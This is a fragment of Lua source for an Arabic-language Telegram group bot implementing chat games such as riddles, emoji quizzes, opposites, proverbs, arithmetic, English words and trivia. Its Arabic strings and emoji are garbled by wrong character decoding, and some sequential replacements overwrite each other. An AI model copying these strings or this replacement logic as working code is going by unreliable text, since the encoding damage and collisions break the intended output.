name = string.gsub(name,'ุงูุนูุฑ','ูุง ูู ุงูุดูุก ุงูุฐู ูููุง ุทุงู ูุตุฑ ุ ')
name = string.gsub(name,'ุงูููู','ูุง ูู ุงูุดูุฆ ุงูุฐู ููุชุจ ููุง ููุฑุฃ ุ')
name = string.gsub(name,'ุงููุดุท','ูู ุฃุณูุงู ููุง ูุนุถ ูุง ูู ุ ')
name = string.gsub(name,'ุงูุญูุฑู','ูุง ูู ุงูุดูุฆ ุงุฐุง ุฃุฎุฐูุง ููู ุงุฒุฏุงุฏ ููุจุฑ ุ')
name = string.gsub(name,'ุงูุจุญุฑ','ูุง ูู ุงูุดูุฆ ุงูุฐู ูุฑูุน ุงุซูุงู ููุง ููุฏุฑ ูุฑูุน ูุณูุงุฑ ุ')
name = string.gsub(name,'ุงูุซูุฌ','ุงูุง ุงุจู ุงููุงุก ูุงู ุชุฑูููู ูู ุงููุงุก ูุช ููู ุงูุง ุ')
name = string.gsub(name,'ุงูุงุณููุฌ','ููู ุซููุจ ููุน ุฐุงูู ุงุญูุถ ุงููุงุก ููู ุงููู ุ')
name = string.gsub(name,'ุงูุตูุช','ุงุณูุฑ ุจูุง ุฑุฌููู ููุง ุงุฏุฎู ุงูุง ุจุงูุงุฐููู ููู ุงูุง ุ')
name = string.gsub(name,'ุจูู','ุญุงูู ููุญููู ูุตู ูุงุดู ููุตู ูุจููู ููู ุงููู ุ ')
RindaTeam = 'โ๏ธฐุงูู ูุงุญุฏ ูุญููุง ูุฑุจุญ โข '..name
Dev_Rio(msg.chat_id_, msg.id_, 1,RindaTeam, 1, 'md')
return false
end end
if text == DevRio:get(Rinda..'Rio:GameNum'..msg.chat_id_) and not DevRio:get(Rinda..'Rio:Games:Ids'..msg.chat_id_) then
if not DevRio:get(Rinda..'Rio:Games:Ids'..msg.chat_id_) then 
RindaTeam = 'โ๏ธฐูุจุฑูู ููุฏ ุฑุจุญุช ูู ุงููุนุจู \nโ๏ธฐุงุฑุณู โข ุญุฒูุฑู ููุนุจ ุบูเขชูู'
Dev_Rio(msg.chat_id_, msg.id_, 1,RindaTeam, 1, 'md')
DevRio:incrby(Rinda..'Rio:GamesNumber'..msg.chat_id_..msg.sender_user_id_, 1)  
end
DevRio:set(Rinda..'Rio:Games:Ids'..msg.chat_id_,true)
end 
if text == 'ุงููุนุงูู' and ChCheck(msg) or text == 'ูุนุงูู' and ChCheck(msg) or text == 'โข ูุนุงูู โ' and ChCheck(msg) then
if not DevRio:get(Rinda..'Rio:Lock:Games'..msg.chat_id_) then
DevRio2 = {'ูุฑุฏ','ุฏุฌุงุฌู','ุจุทุฑูู','ุถูุฏุน','ุจููู','ูุญูู','ุฏูู','ุฌูู','ุจูุฑู','ุฏููููู','ุชูุณุงุญ','ูุฑุด','ููุฑ','ุงุฎุทุจูุท','ุณููู','ุฎูุงุด','ุงุณุฏ','ูุฃุฑ','ุฐุฆุจ','ูุฑุงุดู','ุนูุฑุจ','ุฒุฑุงูู','ูููุฐ','ุชูุงุญู','ุจุงุฐูุฌุงู'}
name = DevRio2[math.random(#DevRio2)]
DevRio:set(Rinda..'Rio:GameNum2'..msg.chat_id_,name)
DevRio:del(Rinda..'Rio:Games:Ids'..msg.chat_id_)
name = string.gsub(name,'ูุฑุฏ','๐')
name = string.gsub(name,'ุฏุฌุงุฌู','๐')
name = string.gsub(name,'ุจุทุฑูู','๐ง')
name = string.gsub(name,'ุถูุฏุน','๐ธ')
name = string.gsub(name,'ุจููู','๐ฆ')
name = string.gsub(name,'ูุญูู','๐')
name = string.gsub(name,'ุฏูู','๐')
name = string.gsub(name,'ุฌูู','๐ซ')
name = string.gsub(name,'ุจูุฑู','๐')
name = string.gsub(name,'ุฏููููู','๐ฌ')
name = string.gsub(name,'ุชูุณุงุญ','๐')
name = string.gsub(name,'ูุฑุด','๐ฆ')
name = string.gsub(name,'ููุฑ','๐')
name = string.gsub(name,'ุงุฎุทุจูุท','๐')
name = string.gsub(name,'ุณููู','๐')
name = string.gsub(name,'ุฎูุงุด','๐ฆ')
name = string.gsub(name,'ุงุณุฏ','๐ฆ')
name = string.gsub(name,'ูุฃุฑ','๐ญ')
name = string.gsub(name,'ุฐุฆุจ','๐บ')
name = string.gsub(name,'ูุฑุงุดู','๐ฆ')
name = string.gsub(name,'ุนูุฑุจ','๐ฆ')
name = string.gsub(name,'ุฒุฑุงูู','๐ฆ')
name = string.gsub(name,'ูููุฐ','๐ฆ')
name = string.gsub(name,'ุชูุงุญู','๐')
name = string.gsub(name,'ุจุงุฐูุฌุงู','๐')
RindaTeam = 'โ๏ธฐูุง ูุนูู ูุฐุง ุงูุณูุงูู :ุ โข '..name
Dev_Rio(msg.chat_id_, msg.id_, 1,RindaTeam, 1, 'md')
return false
end end
if text == DevRio:get(Rinda..'Rio:GameNum2'..msg.chat_id_) and not DevRio:get(Rinda..'Rio:Games:Ids'..msg.chat_id_) then
if not DevRio:get(Rinda..'Rio:Games:Ids'..msg.chat_id_) then 
RindaTeam = 'โ๏ธฐูุจุฑูู ููุฏ ุฑุจุญุช ูู ุงููุนุจู \nโ๏ธฐุงุฑุณู โข ุงููุนุงูู ููุนุจ ุบูเขชูู'
Dev_Rio(msg.chat_id_, msg.id_, 1,RindaTeam, 1, 'md')
DevRio:incrby(Rinda..'Rio:GamesNumber'..msg.chat_id_..msg.sender_user_id_, 1)  
end
DevRio:set(Rinda..'Rio:Games:Ids'..msg.chat_id_,true)
end 
if text == 'ุงูุนูุณ' and ChCheck(msg) or text == 'ุนูุณ' and ChCheck(msg) or text == 'โข ุงูุนูุณ โ' and ChCheck(msg) then
if not DevRio:get(Rinda..'Rio:Lock:Games'..msg.chat_id_) then
DevRio2 = {'ุจุงู','ูููุช','ููุฒูู','ุงุณูุนู','ุงุญุจู','ููุญูู','ูุถูู','ุญุงุฑู','ูุงุตู','ุฌูู','ุณุฑูุน','ููุณู','ุทููู','ุณููู','ุถุนูู','ุดุฑูู','ุดุฌุงุน','ุฑุญุช','ุนุฏู','ูุดูุท','ุดุจุนุงู','ููุนุทุดุงู','ุฎูุด ููุฏ','ุงูู','ูุงุฏุฆ'}
name = DevRio2[math.random(#DevRio2)]
DevRio:set(Rinda..'Rio:GameNum3'..msg.chat_id_,name)
DevRio:del(Rinda..'Rio:Games:Ids'..msg.chat_id_)
name = string.gsub(name,'ุจุงู','ููู')
name = string.gsub(name,'ูููุช','ูุงูููุช')
name = string.gsub(name,'ููุฒูู','ุฒูู')
name = string.gsub(name,'ุงุณูุนู','ูุงุณูุนู')
name = string.gsub(name,'ุงุญุจู','ูุงุญุจู')
name = string.gsub(name,'ูุญูู','ุญูู')
name = string.gsub(name,'ูุถูู','ูุตุฎ')
name = string.gsub(name,'ุญุงุฑู','ุจุงุฑุฏู')
name = string.gsub(name,'ูุงุตู','ุนุงูู')
name = string.gsub(name,'ุฌูู','ููู')
name = string.gsub(name,'ุณุฑูุน','ุจุทูุก')
name = string.gsub(name,'ููุณู','ุถูุฌู')
name = string.gsub(name,'ุทููู','ูุฒู')
name = string.gsub(name,'ุณููู','ุถุนูู')
name = string.gsub(name,'ุถุนูู','ููู')
name = string.gsub(name,'ุดุฑูู','ููุงุฏ')
name = string.gsub(name,'ุดุฌุงุน','ุฌุจุงู')
name = string.gsub(name,'ุฑุญุช','ุงุฌูุช')
name = string.gsub(name,'ุญู','ููุช')
name = string.gsub(name,'ูุดูุท','ูุณูู')
name = string.gsub(name,'ุดุจุนุงู','ุฌูุนุงู')
name = string.gsub(name,'ููุนุทุดุงู','ุนุทุดุงู')
name = string.gsub(name,'ุฎูุด ููุฏ','ููุฎูุด ููุฏ')
name = string.gsub(name,'ุงูู','ูุทู')
name = string.gsub(name,'ูุงุฏุฆ','ุนุตุจู')
RindaTeam = 'โ๏ธฐูุง ูู ุนูุณ ูููุฉ โข '..name
Dev_Rio(msg.chat_id_, msg.id_, 1,RindaTeam, 1, 'md')
return false
end end
if text == DevRio:get(Rinda..'Rio:GameNum3'..msg.chat_id_) and not DevRio:get(Rinda..'Rio:Games:Ids'..msg.chat_id_) then
if not DevRio:get(Rinda..'Rio:Games:Ids'..msg.chat_id_) then 
RindaTeam = 'โ๏ธฐูุจุฑูู ููุฏ ุฑุจุญุช ูู ุงููุนุจู \nโ๏ธฐุงุฑุณู โข ุงูุนูุณ ููุนุจ ุบูเขชูู'
Dev_Rio(msg.chat_id_, msg.id_, 1,RindaTeam, 1, 'md')
DevRio:incrby(Rinda..'Rio:GamesNumber'..msg.chat_id_..msg.sender_user_id_, 1)  
end
DevRio:set(Rinda..'Rio:Games:Ids'..msg.chat_id_,true)
end 
if text == 'ุงููุฎุชูู' and ChCheck(msg) or text == 'ูุฎุชูู' and ChCheck(msg) or text == 'โข ุงููุฎุชูู โ' and ChCheck(msg) then
if not DevRio:get(Rinda..'Rio:Lock:Games'..msg.chat_id_) then
DevRio2 = {'๐ธ','โ?','๐ผ','๐','๐','๐','โญ๏ธ','๐ฅ','โ','๐ฅ','โ๏ธ','๐จโ๐ฌ','๐จโ๐ป','๐จโ๐ง','๐ฉโ๐ณ','๐งโโ','๐งโโ๏ธ','๐งโโ','๐โโ','๐งโโ','๐ฌ','๐จโ๐จโ๐ง','๐','๐ค','โ๏ธ','๐','๐ฉโโ๏ธ','๐จโ๐จ'};
name = DevRio2[math.random(#DevRio2)]
DevRio:set(Rinda..'Rio:GameNum4'..msg.chat_id_,name)
DevRio:del(Rinda..'Rio:Games:Ids'..msg.chat_id_)
name = string.gsub(name,'๐ธ','๐น๐น๐น๐ธ๐น๐น๐น๐น')
name = string.gsub(name,'โ?๏ธ','๐๐๐โ?๏ธ๐๐๐๐')
name = string.gsub(name,'๐ผ','๐ป๐ป๐ป๐ป๐ป๐ป๐ป๐ผ')
name = string.gsub(name,'๐','๐๐๐๐๐๐๐๐')
name = string.gsub(name,'๐','๐๐๐๐๐๐๐๐')
name = string.gsub(name,'๐','๐๐๐๐๐๐๐๐')
name = string.gsub(name,'โญ๏ธ','๐๐๐๐๐๐โญ๏ธ๐')
name = string.gsub(name,'๐ฅ','๐ซ๐ซ๐ซ๐ฅ๐ซ๐ซ๐ซ๐ซ')
name = string.gsub(name,'โ','๐จ๐จ๐จโ๐จ๐จ๐จ๐จ')
name = string.gsub(name,'๐ฅ','โ๏ธโ๏ธโ๏ธ๐ฅโ๏ธโ๏ธโ๏ธโ๏ธ')
name = string.gsub(name,'โ๏ธ','โ๏ธโ๏ธโ๏ธโ๏ธโ๏ธโ๏ธโ๏ธโ๏ธโ๏ธ')
name = string.gsub(name,'๐จโ๐ฌ','๐ฉโ๐ฌ๐ฉโ๐ฌ๐ฉโ๐ฌ๐ฉโ๐ฌ๐ฉโ๐ฌ๐จโ๐ฌ๐ฉโ๐ฌ๐ฉโ๐ฌ')
name = string.gsub(name,'๐จโ๐ป','๐ฉโ๐ป๐ฉโ๐ป๐จโ๐ป๐ฉโ๐ป๐ฉโ๐ป๐ฉโ๐ป๐ฉโ๐ป๐ฉโ๐ป')
name = string.gsub(name,'๐จโ๐ง','๐ฉโ๐ง๐ฉโ๐ง๐ฉโ๐ง๐ฉโ๐ง๐ฉโ๐ง๐ฉโ๐ง๐จโ๐ง๐ฉโ๐ง')
name = string.gsub(name,'๐ฉโ๐ณ','๐จโ๐ณ๐จโ๐ณ๐ฉโ๐ณ๐จโ๐ณ๐จโ๐ณ๐จโ๐ณ๐จโ๐ณ๐จโ๐ณ')
name = string.gsub(name,'๐งโโ๏ธ','๐งโโ๏ธ๐งโโ๏ธ๐งโโ๏ธ๐งโโ๏ธ๐งโโ๏ธ๐งโโ๏ธ๐งโโ๏ธ๐งโโ๏ธ')
name = string.gsub(name,'๐งโโ๏ธ','๐งโโ๏ธ๐งโโ๏ธ๐งโโ๏ธ๐งโโ๏ธ๐งโโ๏ธ๐งโโ๏ธ๐งโโ๏ธ๐งโโ๏ธ')
name = string.gsub(name,'๐งโโ๏ธ','๐งโโ๏ธ๐งโโ๏ธ๐งโโ๏ธ๐งโโ๏ธ๐งโโ๏ธ๐งโโ๏ธ๐งโโ๏ธ๐งโโ๏ธ')
name = string.gsub(name,'๐โโ๏ธ','๐โโ๏ธ๐โโ๏ธ๐โโ๏ธ๐โโ๏ธ๐โโ๏ธ๐โโ๏ธ๐โโ๏ธ๐โโ๏ธ')
name = string.gsub(name,'๐งโโ๏ธ','๐งโโ๏ธ๐งโโ๏ธ๐งโโ๏ธ๐งโโ๏ธ๐งโโ๏ธ๐งโโ๏ธ๐งโโ๏ธ๐งโโ๏ธ')
name = string.gsub(name,'๐ฌ','๐ญ๐ญ๐ญ๐ญ๐ฌ๐ญ๐ญ๐ญ')
name = string.gsub(name,'๐จโ๐จโ๐ง','๐จโ๐จโ๐ฆ๐จโ๐จโ๐ฆ๐จโ๐จโ๐ฆ๐จโ๐จโ๐ฆ๐จโ๐จโ๐ฆ๐จโ๐จโ๐ง๐จโ๐จโ๐ฆ๐จโ๐จโ๐ฆ')
name = string.gsub(name,'๐','๐๐๐๐๐๐๐๐')
name = string.gsub(name,'๐ค','๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ค๐ฅ๐ฅ')
name = string.gsub(name,'โ๏ธ','โณโณโณโณโณโ๏ธโณโณ')
name = string.gsub(name,'๐','๐๐๐๐๐๐๐๐')
name = string.gsub(name,'๐ฉโโ๏ธ','๐จโโ๏ธ๐จโโ๏ธ๐จโโ๏ธ๐จโโ๏ธ๐จโโ๏ธ๐ฉโโ๏ธ๐จโโ๏ธ๐จโโ๏ธ')
name = string.gsub(name,'๐จโ๐จ','๐ฉโ๐จ๐ฉโ๐จ๐จโ๐จ๐ฉโ๐จ๐ฉโ๐จ๐ฉโ๐จ๐ฉโ๐จ๐ฉโ๐จ')
RindaTeam = 'โ๏ธฐุงูู ูุงุญุฏ ูุทูุน ุงููุฎุชูู ูุฑุจุญ\n{'..name..'} '
Dev_Rio(msg.chat_id_, msg.id_, 1,RindaTeam, 1, 'md')
return false
end end
if text == DevRio:get(Rinda..'Rio:GameNum4'..msg.chat_id_) and not DevRio:get(Rinda..'Rio:Games:Ids'..msg.chat_id_) then
if not DevRio:get(Rinda..'Rio:Games:Ids'..msg.chat_id_) then 
RindaTeam = 'โ๏ธฐูุจุฑูู ููุฏ ุฑุจุญุช ูู ุงููุนุจู \nโ๏ธฐุงุฑุณู โข ุงููุฎุชูู ููุนุจ ุบูเขชูู'
Dev_Rio(msg.chat_id_, msg.id_, 1,RindaTeam, 1, 'md')
DevRio:incrby(Rinda..'Rio:GamesNumber'..msg.chat_id_..msg.sender_user_id_, 1)  
end
DevRio:set(Rinda..'Rio:Games:Ids'..msg.chat_id_,true)
end  
if text == 'ุงูุซูู' and ChCheck(msg) or text == 'ุงูุงูุซูู' and ChCheck(msg) or text == 'โข ุงูุซูู โ' and ChCheck(msg) then
if not DevRio:get(Rinda..'Rio:Lock:Games'..msg.chat_id_) then
DevRio2 = {
'ุฌูุฒ','ุถุฑุงุทู','ุงูุญุจู','ุงูุญุงูู','ุดูุฑู','ุจูุฏู','ุณูุงูู','ุงููุฎูู','ุงูุฎูู','ุญุฏุงุฏ','ุงููุจูู','ูุฑูุต','ูุฑุฏ','ุงูุนูุจ','ุงูุนูู','ุงูุฎุจุฒ','ุจุงูุญุตุงุฏ','ุดูุฑ','ุดูู','ููุญูู',
};
name = DevRio2[math.random(#DevRio2)]
DevRio:set(Rinda..'Rio:GameNum5'..msg.chat_id_,name)
DevRio:del(Rinda..'Rio:Games:Ids'..msg.chat_id_)
name = string.gsub(name,'ุฌูุฒ','ููุทู ___ ูููุงุนูุฏู ุณููู')
name = string.gsub(name,'ุถุฑุงุทู','ุงูู ูุณูู ุงููุทู ูุชุญูู ___ ')
name = string.gsub(name,'ุจูุฏู','ุงูู ___ ูุญุฏ ูููุฏู')
name = string.gsub(name,'ุงูุญุงูู','ุชุฌุฏู ูู ___ ูุนุงู')
name = string.gsub(name,'ุดูุฑู','ูุน ุงูุฎูู ูุง ___ ')
name = string.gsub(name,'ุงููุฎูู','ุงูุทูู ุทูู ___ ูุงูุนูู ุนูู ุงูุตุฎูุฉ')
name = string.gsub(name,'ุณูุงูู','ุจุงููุฌู ุงูุฑุงูุฉ ูุจุงูุธูุฑ ___ ')
name = string.gsub(name,'ุงูุฎูู','ูู ููุฉ ___ ุดุฏู ุนูู ุงูฺูุงุจ ุณุฑูุฌ')
name = string.gsub(name,'ุญุฏุงุฏ','ูููู ูู ุตุฎู ูุฌูู ูุงู ุขูู ___ ')
name = string.gsub(name,'ุงููุจูู',' ___ ูุง ูุฎุงู ูู ุงููุทุฑ')
name = string.gsub(name,'ุงูุญุจู','ุงููู ุชูุฏุบุฉ ุงูุญูุฉ ูุฎุงู ูู ุฌุฑุฉ ___ ')
name = string.gsub(name,'ูุฑูุต','ุงููุงูุนุฑู ___ ูููู ุงููุงุน ุนูุฌู')
name = string.gsub(name,'ุงูุนูุจ','ุงููุงูููุญ ___ ูููู ุญุงูุถ')
name = string.gsub(name,'ุงูุนูู','___ ุฅุฐุง ุญุจุช ุงูฺูุฉ ุงุจููุณ ูุฏุฎู ุงูุฌูุฉ')
name = string.gsub(name,'ุงูุฎุจุฒ','ุงูุทู ___ ููุฎุจุงุฒ ุญุชู ูู ูุงูู ูุตู')
name = string.gsub(name,'ุจุงูุญุตุงุฏ','ุงุณูุฉ ___ ูููุฌูู ููุณูุฑ')
name = string.gsub(name,'ุดูุฑ','ุงูุดู ___ ููุง ุชุนุจุฑ ููุฑ')
name = string.gsub(name,'ุดูู','ูุงูู ุชุนุจ ูุงูู ___ ูุง ูู ุนูู ุงูุญุงุถุฑ ููุฉ')
name = string.gsub(name,'ุงููุฑุฏ',' ___ ุจุนูู ุงูู ุบุฒุงู')
name = string.gsub(name,'ููุญูู','ุงุฌู ___ ุนูุงูุง')
RindaTeam = 'โ๏ธฐุงููู ุงููุซุงู ุงูุชุงูู โข ['..name..']'
Dev_Rio(msg.chat_id_, msg.id_, 1,RindaTeam, 1, 'md')
return false
end end
if text == DevRio:get(Rinda..'Rio:GameNum5'..msg.chat_id_) then
if not DevRio:get(Rinda..'Rio:Games:Ids'..msg.chat_id_) then 
DevRio:incrby(Rinda..'Rio:GamesNumber'..msg.chat_id_..msg.sender_user_id_, 1)  
DevRio:del(Rinda..'Rio:GameNum5'..msg.chat_id_)
RindaTeam = 'โ๏ธฐูุจุฑูู ููุฏ ุฑุจุญุช ูู ุงููุนุจู \nโ๏ธฐุงุฑุณู โข ุงูุซูู ููุนุจ ุบูเขชูู'
Dev_Rio(msg.chat_id_, msg.id_, 1,RindaTeam, 1, 'md')
end
DevRio:set(Rinda..'Rio:Games:Ids'..msg.chat_id_,true)
end  
if text == 'ุฑูุงุถูุงุช' and ChCheck(msg) or text == 'ุงูุฑูุงุถูุงุช' and ChCheck(msg) or text == 'โข ุฑูุงุถูุงุช โ' and ChCheck(msg) then
if not DevRio:get(Rinda..'Rio:Lock:Games'..msg.chat_id_) then
DevRio2 = {'9','46','2','9','5','4','25','10','17','15','39','5','16',};
name = DevRio2[math.random(#DevRio2)]
DevRio:set(Rinda..'Rio:GameNum6'..msg.chat_id_,name)
DevRio:del(Rinda..'Rio:Games:Ids'..msg.chat_id_)
name = string.gsub(name,'9','7 + 2 = ?')
name = string.gsub(name,'46','41 + 5 = ?')
name = string.gsub(name,'2','5 - 3 = ?')
name = string.gsub(name,'9','5 + 2 + 2 = ?')
name = string.gsub(name,'5','8 - 3 = ?')
name = string.gsub(name,'4','40 รท 10 = ?')
name = string.gsub(name,'25','30 - 5 = ?')
name = string.gsub(name,'10','100 รท 10 = ?')
name = string.gsub(name,'17','10 + 5 + 2 = ?')
name = string.gsub(name,'15','25 - 10 = ?')
name = string.gsub(name,'39','44 - 5 = ?')
name = string.gsub(name,'5','12 + 1 - 8 = ?')
name = string.gsub(name,'16','16 + 16 - 16 = ?')
RindaTeam = 'โ๏ธฐุงููู ุงููุนุงุฏูู ุงูุชุงููู โข โค\n{'..name..'} '
Dev_Rio(msg.chat_id_, msg.id_, 1,RindaTeam, 1, 'md')
return false
end end
if text == DevRio:get(Rinda..'Rio:GameNum6'..msg.chat_id_) then
if not DevRio:get(Rinda..'Rio:Games:Ids'..msg.chat_id_) then 
DevRio:incrby(Rinda..'Rio:GamesNumber'..msg.chat_id_..msg.sender_user_id_, 1)  
DevRio:del(Rinda..'Rio:GameNum6'..msg.chat_id_)
RindaTeam = 'โ๏ธฐูุจุฑูู ููุฏ ุฑุจุญุช ูู ุงููุนุจู \nโ๏ธฐุงุฑุณู โข ุฑูุงุถูุงุช ููุนุจ ุบูเขชูู'
Dev_Rio(msg.chat_id_, msg.id_, 1,RindaTeam, 1, 'md')
end
DevRio:set(Rinda..'Rio:Games:Ids'..msg.chat_id_,true)
end  
if text == 'ุงูุงููููุฒู' and ChCheck(msg) or text == 'ุงูุงูุฌููุฒูู' and ChCheck(msg) or text == 'ุงููููุฒูู' and ChCheck(msg) or text == 'โข ุงููููุฒู โ' and ChCheck(msg) then
if not DevRio:get(Rinda..'Rio:Lock:Games'..msg.chat_id_) then
DevRio2 = {'ูุนูููุงุช','ูููุงุช','ูุฌููุนุงุช','ูุชุงุจ','ุชูุงุญู','ุณุฏูู','ูููุฏ','ุงุนูู','ุฐุฆุจ','ุชูุณุงุญ','ุฐูู','ุดุงุทุฆ','ุบุจู',};
name = DevRio2[math.random(#DevRio2)]
DevRio:set(Rinda..'Rio:GameNum7'..msg.chat_id_,name)
DevRio:del(Rinda..'Rio:Games:Ids'..msg.chat_id_)
name = string.gsub(name,'ุฐุฆุจ','Wolf')
name = string.gsub(name,'ูุนูููุงุช','Information')
name = string.gsub(name,'ูููุงุช','Channels')
name = string.gsub(name,'ูุฌููุนุงุช','Groups')
name = string.gsub(name,'ูุชุงุจ','Book')
name = string.gsub(name,'ุชูุงุญู','Apple')
name = string.gsub(name,'ูููุฏ','money')
name = string.gsub(name,'ุงุนูู','I know')
name = string.gsub(name,'ุชูุณุงุญ','crocodile')
name = string.gsub(name,'ุดุงุทุฆ','Beach')
name = string.gsub(name,'ุบุจู','Stupid')
name = string.gsub(name,'ุตุฏุงูู','Friendchip')
RindaTeam = 'โ๏ธฐูุง ูุนูู ูููุฉ โข '..name
Dev_Rio(msg.chat_id_, msg.id_, 1,RindaTeam, 1, 'md')
return false
end end
if text == DevRio:get(Rinda..'Rio:GameNum7'..msg.chat_id_) then
if not DevRio:get(Rinda..'Rio:Games:Ids'..msg.chat_id_) then 
DevRio:incrby(Rinda..'Rio:GamesNumber'..msg.chat_id_..msg.sender_user_id_, 1)  
DevRio:del(Rinda..'Rio:GameNum7'..msg.chat_id_)
RindaTeam = 'โ๏ธฐูุจุฑูู ููุฏ ุฑุจุญุช ูู ุงููุนุจู \nโ๏ธฐุงุฑุณู โข ุงููููุฒูู ููุนุจ ุบูเขชูู'
Dev_Rio(msg.chat_id_, msg.id_, 1,RindaTeam, 1, 'md')
end
DevRio:set(Rinda..'Rio:Games:Ids'..msg.chat_id_,true)
end  
--     ๐ฒ๐ฎ๐๐ฑc๐ค ๐ฑ๐๐ญd๐บ     --
if text == 'ุงุณุฆูู' and ChCheck(msg) or text == 'ุงุฎุชูุงุฑุงุช' and ChCheck(msg) or text == 'ุงูุงุณุฆูู' and ChCheck(msg) or text == 'ุงุณุงูู' and ChCheck(msg) or text == 'โข ุงุณุฆูู โ' and ChCheck(msg) then
if not DevRio:get(Rinda..'Rio:Lock:Games'..msg.chat_id_) then
DevRio2 = {'ุงูููู','14','ุงููู','11','30','ุจูุชูู','ุณุชูู ุฌูุจุฑ','ุจุงุฑูุณ','10','ุงูููู','ุญุฑู ุงููุงู','ุงูุดุนุฑ','ุณุญุงุจ','ุงูุงุณู','ุฐูุจ','ุญุฑู ุงูุงู','ุงูุนุฒุงุฆู','ุงูุณุงุช','ุงูููุฌููู','ุงุณูุง','6','ุงูุงุณุฏ','ููุฑ','ุงูุฏููููู','ุงูุฑูุจุง','ุงูุฒุฆุจู','ููุฏู','ุงูุงูุณุงู','ุทูููู','ุฎุฏูุฌู',}
name = DevRio2[math.random(#DevRio2)]
DevRio:set(Rinda..'Rio:GameNum8'..msg.chat_id_,name)
DevRio:del(Rinda..'Rio:Games:Ids'..msg.chat_id_)
name = string.gsub(name,'ุงูููู','โ๏ธฐูุงูู ุงุทูู ููุฑ ูู ุงูุนุงูู ุ\n1- ุงูููู\n2- ุงููุฑุงุช\n3- ููุฑ ุงููููุบู')
name = string.gsub(name,'14','โ๏ธฐูุงุนุฏุฏ ุนุธุงู ุงููุฌู ุ\n1- 15\n2- 13\n3- 14')
name = string.gsub(name,'ุงููู','โ๏ธฐูุฑุงุณู ุจูุถุงุก ูุฌุฏุฑุงู ูุฑุฏูู ุงุฐุง ุงุบููุชู ุงุตุจุญ ุธูุงู  ููู ุงููู ุ\n1- ุงููู\n2- ุงูุงุฐู\n3- ุงูุซูุงุฌู')
name = string.gsub(name,'11','โ๏ธฐูู ุฌุฒุก ูุญุชูู ูุณูุณู ูุงุฏู ุงูุฐุฆุงุจ ุ\n1- 7\n2- 15\n3- 11')
name = string.gsub(name,'30','โ๏ธฐูู ุฌุฒุก ูุญุชูู ุงููุฑุงู ุงููุฑูู ุ\n1- 60\n2- 70\n3- 30')
name = string.gsub(name,'ุจูุชูู','โ๏ธฐูู ููู ุงุบูู ุฑุฆูุณ ูู ุงูุนุงูู ุ\n1- ุชุฑุงูุจ\n2- ุงูุจุงูุง\n3- ุจูุชูู')
name = string.gsub(name,'ุณุชูู ุฌูุจุฑ','โ๏ธฐูู ููู ูุคุณุณ ุดุฑูู ุงุจู ุงูุนุงูููู  ุ\n1- ูุงุฑู ุจุงูุฌ\n2- ุจูู ุฌูุชุณ\n3- ุณุชูู ุฌูุจุฑ')
name = string.gsub(name,'ุจุงุฑูุณ','ูุงูู ุนุงุตูู ูุฑูุณุง ุ\n1- ุจุงุฑูุณ\n2- ูููู\n3- ููุณูู')
name = string.gsub(name,'10','โ๏ธฐูุงุนุฏุฏ ุฏูู ุงูุนุฑุจูู ุงูุชู ุชูุฌุฏ ูู ุงูุฑูููุง ุ\n1- 10\n2- 17\n3- 9')
name = string.gsub(name,'ุงูููู','โ๏ธฐูุงูู ุงูุญููุงู ุงูุฐู ูุญูู 50 ููู ูุฒูู ุ\n1- ุงูููู\n2- ุงูููู\n3- ุงูุซูุฑ')
name = string.gsub(name,'ุญุฑู ุงููุงู','โ๏ธฐูุงุฐุง ููุฌุฏ ุจููู ูุจููู ุ\n1- ุงูุถู\n2- ุงูุงุฎูุงู\n3- ุญุฑู ุงููุงู')
name = string.gsub(name,'ุงูุดุนุฑ','โ๏ธฐูุงูู ุงูุดูุก ุงููุจุงุช ููุจุช ููุงูุณุงู ุจูุง ุจุฐุฑ ุ\n1- ุงูุงุถุงูุฑ\n2- ุงูุงุณูุงู\n3- ุงูุดุนุฑ')
name = string.gsub(name,'ุณุญุงุจ','โ๏ธฐูุง ูู ุงูุดููุก ุงูุฐู ูุณุชุทูุน ุงููุดู ุจุฏูู ุฃุฑุฌู ูุงูุจูุงุก ุจุฏูู ุฃุนูู ุ\n1- ุณุญุงุจ\n2- ุจุฆุฑ\n3- ููุฑ')
name = string.gsub(name,'ุงูุงุณู','โ๏ธฐูุง ุงูุดูุก ุงูุฐู ููุชููู , ูููู ุบูุฑูุง ูุณุชุนููู ุฃูุซุฑ ูููุง ุ\n1- ุงูุนูุฑ\n2- ุณุงุนู\n3- ุงูุงุณู')
name = string.gsub(name,'ุฐูุจ','โ๏ธฐุงุตูุฑ ุงูููู ุณุงุฑู ุนููู ุงูู ุงูููู ูุญุงุฑููู ูุฐูุฐ ุงูููู ุ\n1- ูุญุงุณ\n2- ุงููุงุณ\n3- ุฐูุจ')
name = string.gsub(name,'ุญุฑู ุงูุงู','โ๏ธฐูู ุงูููู ุซูุงุซุฉ ูููู ูู ุงูููุงุฑ ูุงุญุฏู ููุง ูู ุ\n1- ุญุฑู ุงูุจุงุก\n2- ุญุฑู ุงูุงู\n3- ุญุฑู ุงูุฑุงุก')
name = string.gsub(name,'ุงูุนุฒุงุฆู','โ๏ธฐุนูู ูุฏุฑ ุงุตู ุงูุนุฒู ุชุฃุชู ุ\n1- ุงูุนุฒุงุฆู\n2- ุงูููุงุฑู\n3- ุงููุจุงุฆุจ')
name = string.gsub(name,'ุงูุณุงุช','โ๏ธฐูุงูู ุฌูุน ูููู ุงูุณู ุ\n1- ุณูุฏุงุช\n2- ุงูุณุงุช\n3- ููุงูุต')
name = string.gsub(name,'ุงูููุฌููู','โ๏ธฐุงูู ุงุชุณุนููุช ูุฏููุง ูู ุงูุญุฑูุจ ุ\n1- ุงูุตุงุฑูุฎ\n2- ุงููุณุฏุณ\n3- ุงูููุฌููู')
name = string.gsub(name,'ุงุณูุง','โ๏ธฐุชูุน ูุจูุงู ูู ูุงุฑู ุ\n1- ุงูุฑูููุง\n2- ุงุณูุง\n3- ุงูุฑููุง ุงูุดูุงููู')
name = string.gsub(name,'6','โ๏ธฐูู ุตูุฑุง ููููููู ุ\n1- 4\n2- 3\n3- 6')
name = string.gsub(name,'ุงูุงุณุฏ','โ๏ธฐูุงูู ุงูุญููุงู ุงูุฐู ูููุจ ุจููู ุงูุบุงุจู ุ\n1- ุงูููู\n2- ุงูุงุณุฏ\n3- ุงูููุฑ')
name = string.gsub(name,'ููุฑ','โ๏ธฐูุง ุงุณู ุตุบูุฑ ุงูุญุตุงู ุ\n1- ููุฑ\n2- ุฌุฑู\n3- ุนุฌู')
